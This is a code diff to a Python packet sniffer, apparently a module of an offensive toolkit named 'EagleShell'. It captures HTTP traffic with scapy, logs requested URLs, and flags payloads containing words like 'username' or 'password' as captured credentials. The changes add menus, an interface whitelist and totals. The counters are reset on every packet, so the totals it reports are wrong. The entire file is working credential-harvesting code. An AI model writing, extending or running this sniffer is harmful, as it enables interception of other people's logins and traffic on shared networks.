@@ -16,6 +16,7 @@ def packetsniffer_main():
     # Function that takes user input
     def configuration():
         try:
+            global interface_set
             os.system(clear_screen)
             print(logo)
             print('')
@@ -30,9 +31,30 @@ def packetsniffer_main():
             print('')
             while True:
                 interface_set = input('\u001b[33mINTERFACE \u001b[37m> ').lower()
-                sniff(interface_set)
+                if interface_set == 'wlan0' or interface_set == 'wlan1' or interface_set == 'wlan2' or interface_set == 'wlan3' or interface_set == 'mon0' or interface_set == 'mon1' or interface_set == 'mon2' or interface_set == 'mon3' or interface_set == 'wlp5s0' or interface_set == 'wlp5s1' or interface_set == 'wlp5s2' or interface_set == 'wlp5s3' or interface_set == 'eth0' or interface_set == 'eth1' or interface_set == 'eth2' or interface_set == 'eth3':
+                    functions()
+                else:
+                    print('\u001b[31m[-] Invalid Input.')
+                    continue
         except KeyboardInterrupt:
             exit_shell()
+
+    def functions():
+        os.system(clear_screen)
+        print(logo)
+        print('')
+        print(line)
+        print(packetsniffer_banner)
+        print(line)
+        print('')
+        print(author)
+        print('Output:')
+        print('')
+        print('\tControls')
+        print('\t--------')
+        print('\tStop: CTRL+C')
+        print('')
+        sniff(interface_set)
 
     # Function that shows all available and unavailable interfaces
     def ips():
@@ -45,27 +67,76 @@ def packetsniffer_main():
                 print('\n\t[-] Unavailable Interface: ' + i)
 
     def sniff(interface):
-        scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+        try:
+            scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+        except KeyboardInterrupt:
+            result()
 
     def get_url(packet):
-        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+        try:
+            return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+        except KeyboardInterrupt:
+            result()
 
     def get_login_info(packet):
-        if packet.haslayer(scapy.Raw):
-            load = str(packet[scapy.Raw].load)
-            keywords = ["username", "user", "login", "password", "pass"]
-            for keywords in keywords:
-                if keywords in load:
-                    return load
+        try:
+            if packet.haslayer(scapy.Raw):
+                load = str(packet[scapy.Raw].load)
+                keywords = ["username", "user", "login", "password", "pass"]
+                for keywords in keywords:
+                    if keywords in load:
+                        return load
+        except KeyboardInterrupt:
+            result()
 
     def process_sniffed_packet(packet):
-        if packet.haslayer(http.HTTPRequest):
-            url = get_url(packet)
-            print("HTTP Request >> " + url.decode())
+        global total_requests
+        global total_credentials
+        total_requests = 0
+        total_credentials = 0
+        try:
+            if packet.haslayer(http.HTTPRequest):
+                url = get_url(packet)
+                print("\t\u001b[33;1m[+] \u001b[32;1mHTTP Request \u001b[37;1m>> \u001b[36;1m" + url.decode())
+                total_requests += 1
+                login_info = get_login_info(packet)
+                if login_info:
+                    print("\t\u001b[33;1m[+] \u001b[32;1mPossible Credentials \u001b[37;1m>> \u001b[43m\u001b[31m" + login_info + "\u001b[0m\u001b[31;1m")
+                    total_credentials += 1
+        except KeyboardInterrupt:
+            result()
 
-            login_info = get_login_info(packet)
-            if login_info:
-                print("\n\n[+] Possible username/password > " + login_info + "\n\n")
+    def result():
+        try:
+            os.system(clear_screen)
+            print(logo)
+            print('')
+            print(line)
+            print(packetsniffer_banner)
+            print(line)
+            print('')
+            print(author)
+            print('Result:')
+            print('')
+            print('INTERFACE: ' + interface_set)
+            print('')
+            print('TOTAL REQUESTS: ' + str(total_requests))
+            print('TOTAL CREDENTIALS: ' + str(total_credentials))
+            print('')
+            print('\t1): New')
+            print('\t2): Exit')
+            print('')
+            while True:
+                result_cmd = input('\u001b[33mEagleShell \u001b[37m> ').lower()
+                if result_cmd == '1':
+                    packetsniffer_main()
+                elif result_cmd == '2':
+                    exit_shell()
+                else:
+                    print('\u001b[31m[-] Invalid Input.')
+                    continue
+        except KeyboardInterrupt:
+            exit_shell()
 
     # Function that exit
     def exit_shell():
